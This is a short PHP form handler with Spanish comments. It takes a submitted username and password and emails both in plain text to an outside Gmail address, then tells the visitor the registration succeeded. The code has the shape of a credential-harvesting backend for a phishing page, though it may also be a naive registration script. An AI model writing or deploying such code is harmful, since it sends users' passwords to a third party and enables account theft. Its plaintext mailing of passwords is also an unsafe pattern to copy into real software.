<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Validaci�n b�sica (puedes implementar validaciones m�s robustas)
    if (empty($username) || empty($password)) {
        echo "Por favor, completa todos los campos.";
        exit;
    }

    // Env�o de correo electr�nico
    $to = "narinoa782@gmail.com";
    $subject = "Nuevo registro - Datos del usuario";
    $message = "Nombre de usuario: $username\nContrase�a: $password";

    // Ajusta las cabeceras seg�n sea necesario (por ejemplo, para el formato HTML)
    $headers = "From: webmaster@example.com";

    // Env�a el correo electr�nico
    $success = mail($to, $subject, $message, $headers);

    if ($success) {
        echo "Registro exitoso. Se ha enviado un correo electr�nico con los datos.";
    } else {
        echo "Hubo un problema al enviar el correo electr�nico. Por favor, intenta de nuevo.";
    }
} else {
    // Si se intenta acceder directamente al archivo PHP
    echo "Acceso no permitido.";
}
?>
